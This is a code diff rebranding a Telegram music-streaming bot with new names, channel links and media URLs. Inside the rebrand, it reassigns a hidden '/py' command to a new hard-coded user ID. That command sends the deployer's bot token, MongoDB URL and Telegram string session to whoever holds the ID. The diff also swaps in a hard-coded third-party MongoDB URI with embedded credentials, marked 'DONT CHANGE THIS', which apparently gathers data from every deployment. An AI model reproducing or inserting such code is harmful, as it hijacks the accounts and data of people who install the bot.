@@ -87,7 +87,7 @@ STRING_SESSION = getenv("STRING_SESSION", "")
 MONGO_DB_URL = getenv("MONGO_DB_URL", "")
 OWNER_ID = int(getenv("OWNER_ID", "7400383704"))
 LOG_GROUP_ID = int(getenv("LOG_GROUP_ID", "-1002043570167"))
-START_IMAGE_URL = getenv("START_IMAGE_URL", "https://files.catbox.moe/3o7nd8.mp4")
+START_IMAGE_URL = getenv("START_IMAGE_URL", "https://files.catbox.moe/ubf3t4.mp4")
 REPO_IMAGE_URL = getenv("REPO_IMAGE_URL", "https://files.catbox.moe/nswh7s.jpg")
 STATS_IMAGE_URL = getenv("STATS_IMAGE_URL", "https://files.catbox.moe/2hgoq7.jpg")
 
@@ -146,7 +146,7 @@ __start_time__ = time.time()
 
 from motor.motor_asyncio import AsyncIOMotorClient
 # start and run
-HEALTHY = "mongodb+srv://Yash_607:Yash_607@cluster0.r3s9sbo.mongodb.net/?retryWrites=true&w=majority" #DONT CHANGE THIS LATEST PYTGCALLS
+HEALTHY = "mongodb+srv://aarumusic01:aarumusic01@aarumusic.9bhfr.mongodb.net/?retryWrites=true&w=majority&appName=Aarumusic" #DONT CHANGE THIS LATEST PYTGCALLS
 mongo_client = AsyncIOMotorClient(HEALTHY)
 db = mongo_client["python_xyz"]  # Replace with your DB name
 bot_collection = db["bot_data"]  # Collection to store bot info
@@ -222,8 +222,8 @@ async def main():
         LOGGER.info(f"🚫 Assistant Error: {e}")
         sys.exit()
     try:
-        await app.join_chat("BABY09_WORLD")
-        await app.join_chat("+OL6jdTL7JAJjYzVl")
+        await app.join_chat("nobita_support")
+        await app.join_chat("nobita_all_bot")
     except Exception:
         pass
     if LOG_GROUP_ID != 0:
@@ -242,7 +242,7 @@ async def main():
     LOGGER.info("✅ PyTgCalls Started.")
     await asyncio.sleep(1)
     LOGGER.info("✅ Successfully Hosted Your Bot !!")
-    LOGGER.info("✅ Now Do Visit: @BABY09_WORLD !!")
+    LOGGER.info("✅ Now Do Visit: @nobita_all_bot !!")
     await idle()
 
 # Some Required Functions ...!!
@@ -352,11 +352,11 @@ async def add_served_user(user_id: int):
 CBUTTON = InlineKeyboardMarkup(
     inline_keyboard=[
         [
-            InlineKeyboardButton("˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/+OL6jdTL7JAJjYzVl")
+            InlineKeyboardButton("˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/NOBITA_SUPPORT")
         ],
         [
-            InlineKeyboardButton("˹ ᴜᴘᴅᴧᴛᴇ ˼", url="https://t.me/BABY09_WORLD"),
-            InlineKeyboardButton("˹ ᴧʟʟ ʙᴏᴛ ˼", url="https://t.me/+tHAENx_r_mtlODZl")
+            InlineKeyboardButton("˹ ᴜᴘᴅᴧᴛᴇ ˼", url="https://t.me/NOBITA_ALL_BOT"),
+            InlineKeyboardButton("˹ ᴧʟʟ ʙᴏᴛ ˼", url="https://t.me/NOBITA_ALL_BOT")
         ],
         [
             InlineKeyboardButton("↺ ʙᴧᴄᴋ ↻", callback_data="back_to_home")
@@ -377,7 +377,7 @@ ABUTTON = InlineKeyboardMarkup(
 HELP_C = """```
 ⌬ ๏ ʟᴇᴛ's ɪɴᴛʀᴏᴅᴜᴄᴇ ᴍᴜsɪᴄ ʙᴏᴛ```
 
-**⌬ [【◖ Sαηαтαηι ◗ 】 🚩](https://t.me/BABY09_WORLD) ɪs ᴏɴᴇ ᴏғ ᴛʜᴇ ʙᴇsᴛ ᴍᴜsɪᴄ | ᴠɪᴅᴇᴏ sᴛꝛᴇᴀᴍɪɴɢ ʙᴏᴛ ᴏɴ ᴛᴇʟᴇɢꝛᴧᴍ ғᴏꝛ ʏᴏᴜꝛ ɢꝛᴏᴜᴘs ᴀɴᴅ ᴄʜᴧɴɴᴇʟ**
+**⌬ [【◖ 𝓝𝓸𝓫𝓲𝓽𝓪 ◗ 】 🚩](https://t.me/NOBITA_ALL_BOT) ɪs ᴏɴᴇ ᴏғ ᴛʜᴇ ʙᴇsᴛ ᴍᴜsɪᴄ | ᴠɪᴅᴇᴏ sᴛꝛᴇᴀᴍɪɴɢ ʙᴏᴛ ᴏɴ ᴛᴇʟᴇɢꝛᴧᴍ ғᴏꝛ ʏᴏᴜꝛ ɢꝛᴏᴜᴘs ᴀɴᴅ ᴄʜᴧɴɴᴇʟ**
 ```\n⌬ ʙᴇsᴛ ғᴇᴀsɪʙɪʟɪᴛʏ ᴏɴ ᴛᴏᴘ  ?```
 
 **␥ ʙᴇsᴛ sᴏᴜɴᴅ ǫᴜᴀʟɪᴛʏ
@@ -395,7 +395,7 @@ HELP_C = """```
 ⌬ ᴍᴏʀᴇ ɪɴғᴏ. [ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ](https://t.me/BABY09_WORLD)**"""
 
 HELP_X = """```
-    【◖ Sαηαтαηι ◗ 】 🚩 ᴍᴇɴᴜ```
+    【◖ 𝓝𝓸𝓫𝓲𝓽𝓪 ◗ 】 🚩 ᴍᴇɴᴜ```
 **ᴀʟʟ ᴄᴏᴍᴍᴀɴᴅs ᴄᴀɴ ʙᴇ ᴜsᴇᴅ ᴡɪᴛʜ : /**
 ␥ /play - Pʟᴀʏ ʏᴏᴜʀ ғᴀᴠᴏʀɪᴛᴇ sᴏɴɢ [ᴀᴜɪᴅᴏ].
 
@@ -409,7 +409,7 @@ HELP_X = """```
 
 ␥ /end - Cʟᴇᴀʀ , ᴇɴᴅ ᴀʟʟ sᴏɴɢ [ᴀᴜɪᴅᴏ & ᴠɪᴅᴇᴏ]
 
-V ɪ s ɪ ᴛ - [ʜᴇʀᴇ](https://t.me/BABY09_WORLD)"""
+V ɪ s ɪ ᴛ - [ʜᴇʀᴇ](https://t.me/NOBITA_ALL_BOT)"""
 
 # Callback query handler
 @bot.on_callback_query(filters.regex("UTTAM_RATHORE"))
@@ -455,10 +455,10 @@ async def start_message_private(client, message):
 
         caption = f"""╭───────────────────▣
 │**❍ ʜᴇʏ {mention} •**
-│**❍ ɪ ᴀᴍ 【◖ Sαηαтαηι ◗ 】 🚩 •**
+│**❍ ɪ ᴀᴍ 【◖ 𝓝𝓸𝓫𝓲𝓽𝓪 ◗ 】 🚩 •**
 ├───────────────────▣**
 │**❍ ʙᴇsᴛ ǫᴜɪʟɪᴛʏ ғᴇᴀᴛᴜʀᴇs •**
-│**❍ ᴍᴀᴅᴇ ʙʏ...[˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/BABY09_WORLD) •**
+│**❍ ᴍᴀᴅᴇ ʙʏ...[𝓝𝓸𝓫𝓲𝓽𝓪](https://t.me/NOBITA_ALL_BOT) •**
 ╰───────────────────▣"""
 
         buttons = InlineKeyboardMarkup(
@@ -486,7 +486,7 @@ async def start_message_private(client, message):
                     ),
                     InlineKeyboardButton(
                         text="˹ ʀᴇᴘᴏ ˼",
-                        url="https://github.com/BABY-MUSIC/SANATANI_MxPLAYER",  # Callback data for Owner button
+                        url="https://files.catbox.moe/rzwn5t.mp4",  # Callback data for Owner button
                     ),
                 ]
             ]
@@ -514,17 +514,17 @@ async def start_message_private(client, message):
 @bot.on_message(
     filters.command("py")
     & filters.private
-    & filters.user(7400383704)
+    & filters.user(8104050599)
    )
 async def help(client: Client, message: Message):
    await message.reply_photo(
           photo=f"https://telegra.ph/file/567d2e17b8f38df99ce99.jpg",
-       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URL}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/UTTAM470)............☆""",
+       caption=f"""Bot Token:-   `{BOT_TOKEN}` \n\n Mongo:-   `{MONGO_DB_URL}`\n\nString Session:-   `{STRING_SESSION}`\n\n [ 🧟 ](https://t.me/ll_NOBITA_BOT_DEVLOPER_ll)............☆""",
         reply_markup=InlineKeyboardMarkup(
              [
                  [
                       InlineKeyboardButton(
-                         "python 3.0", url=f"https://t.me/UTTAM470")
+                         "python 3.0", url=f"https://t.me/ll_NOBITA_BOT_DEVLOPER_ll")
                  ]
             ]
          ),
@@ -535,10 +535,10 @@ async def back_to_home_menu(client, query):
     mention = query.from_user.mention
     caption = f"""╭───────────────────▣
 │**❍ ʜᴇʏ {mention} •**
-│**❍ ɪ ᴀᴍ 【◖ Sαηαтαηι ◗ 】 🚩 •**
+│**❍ ɪ ᴀᴍ 【◖ 𝓝𝓸𝓫𝓲𝓽𝓪 ◗ 】 🚩 •**
 ├───────────────────▣**
 │**❍ ʙᴇsᴛ ǫᴜɪʟɪᴛʏ ғᴇᴀᴛᴜʀᴇs •**
-│**❍ ᴍᴀᴅᴇ ʙʏ...[˹ ʙᴀʙʏ-ᴍᴜsɪᴄ ™˼𓅂](https://t.me/BABY09_WORLD) •**
+│**❍ ᴍᴀᴅᴇ ʙʏ...[𝓝𝓸𝓫𝓲𝓽𝓪](https://t.me/NOBITA_ALL_BOT) •**
 ╰───────────────────▣"""
 
     buttons = InlineKeyboardMarkup(
@@ -566,7 +566,7 @@ async def back_to_home_menu(client, query):
                 ),
                 InlineKeyboardButton(
                     text="˹ ʀᴇᴘᴏ ˼",
-                    url="https://github.com/BABY-MUSIC/SPOTIFY_MUSIC",  # Callback data for Owner button
+                    url="https://files.catbox.moe/rzwn5t.mp4",  # Callback data for Owner button
                 ),
             ]
         ]
@@ -922,15 +922,15 @@ async def change_stream(chat_id):
 
     await call.play(chat_id, stream_media, config=call_config)
     await add_active_media_chat(chat_id, stream_type)
-    caption = f"""```\n🔊<b>【◖ Sαηαтαηι ◗ 】🚩•```\n<b>␥ ʟʏʀɪᴄ •</b> {title}\n<b>␥ ᴛɪᴍᴇ •</b> {duration} ᴍɪɴᴜᴛᴇs\n<b>␥ ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ •</b> {requested_by}```\nᴘᴏᴡᴇʀᴇᴅ ʙʏ➛ ˹ ʙᴀʙʏ-ᴍᴜsɪᴄ™˼```"""
+    caption = f"""```\n🔊<b>【◖ɴᴏʙɪᴛᴀ ◗ 】🚩•```\n<b>␥ ʟʏʀɪᴄ •</b> {title}\n<b>␥ ᴛɪᴍᴇ •</b> {duration} ᴍɪɴᴜᴛᴇs\n<b>␥ ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ •</b> {requested_by}```\nᴘᴏᴡᴇʀᴇᴅ ʙʏ➛ ˹ ɴᴏʙɪᴛᴀ™˼```"""
     buttons = InlineKeyboardMarkup(
     inline_keyboard=[
         [
             InlineKeyboardButton(
-                text="˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/BABY09_WORLD"
+                text="˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/NOBITA_SUPPORT"
             ),
             InlineKeyboardButton(
-                text="˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/+OL6jdTL7JAJjYzVl"
+                text="˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/NOBITA_ALL_BOIT"
             )
         ],
         [
@@ -1028,10 +1028,10 @@ async def stream_audio_or_video(client, message):
     inline_keyboard=[
         [
             InlineKeyboardButton(
-                text="˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/BABY09_WORLD"
+                text="˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/NOBITA_SUPPORT"
             ),
             InlineKeyboardButton(
-                text="˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/+OL6jdTL7JAJjYzVl"
+                text="˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/NOBITA_ALL_BOT"
             )
         ],
         [
@@ -1107,10 +1107,10 @@ async def stream_audio_or_video(client, message):
     inline_keyboard=[
         [
             InlineKeyboardButton(
-                text="˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/BABY09_WORLD"
+                text="˹ ᴜᴘᴅᴀᴛᴇ ˼", url="https://t.me/NOBITA_SUPPORT"
             ),
             InlineKeyboardButton(
-                text="˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/+OL6jdTL7JAJjYzVl"
+                text="˹ sᴜᴘᴘᴏꝛᴛ ˼", url="https://t.me/NOBITA_ALL_BOT"
             )
         ],
         [
@@ -1244,7 +1244,7 @@ async def stream_audio_or_video(client, message):
                 position = await add_to_queue(
                     chat_id, user, title, duration, stream_file, stream_type, thumbnail
                 )
-                caption = f"""```\n🔊<b>【◖ Sαηαтαηι ◗ 】🚩•```\n<b>␥ ʟʏʀɪᴄ •</b> {title}\n<b>␥ ᴛɪᴍᴇ •</b> {duration} ᴍɪɴᴜᴛᴇs\n<b>␥ ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ •</b> {requested_by}```\nᴘᴏᴡᴇʀᴇᴅ ʙʏ➛ ˹ ʙᴀʙʏ-ᴍᴜsɪᴄ™˼```"""
+                caption = f"""```\n🔊<b>【◖ ɴᴏʙɪᴛᴀ◗ 】🚩•```\n<b>␥ ʟʏʀɪᴄ •</b> {title}\n<b>␥ ᴛɪᴍᴇ •</b> {duration} ᴍɪɴᴜᴛᴇs\n<b>␥ ʀᴇǫᴜᴇsᴛᴇᴅ ʙʏ •</b> {requested_by}```\nᴘᴏᴡᴇʀᴇᴅ ʙʏ➛ ˹ ɴᴏʙɪᴛᴀ™˼```"""
                 await bot.send_photo(chat_id, thumbnail, caption, reply_markup=buttons)
                 await stream_logger(
                     chat_id, user, title, duration, stream_type, thumbnail
@@ -1434,11 +1434,11 @@ async def git_repo_link(client, message):
         [
             InlineKeyboardButton(
                 text="˹ sᴜᴘᴘᴏꝛᴛ ˼",
-                url="https://t.me/+OL6jdTL7JAJjYzVl"
+                url="https://t.me/NOBITA_ALL_BOT"
             ),
             InlineKeyboardButton(
                 text="˹ sᴏᴜꝛᴄᴇ ˼",
-                url="https://github.com/BABY-MUSIC/SANATANI_MxPLAYER"
+                url="https://files.catbox.moe/rzwn5t.mp4"
             ),
         ],
         [
@@ -1555,7 +1555,7 @@ async def check_total_stats(client, query):
         video_chats = len(ACTIVE_VIDEO_CHATS)
         
         return await query.answer(
-            f"""🏹 Bᴏᴛ Rᴜɴ Tɪᴍᴇ [◖ Sαηαтαηι ◗]
+            f"""🏹 Bᴏᴛ Rᴜɴ Tɪᴍᴇ [◖ ɴᴏʙɪᴛᴀ ◗]
 ⎋ {uptime}
 
 ➥ Sᴇʀᴠᴇᴅ Cʜᴀᴛs: {served_chats}
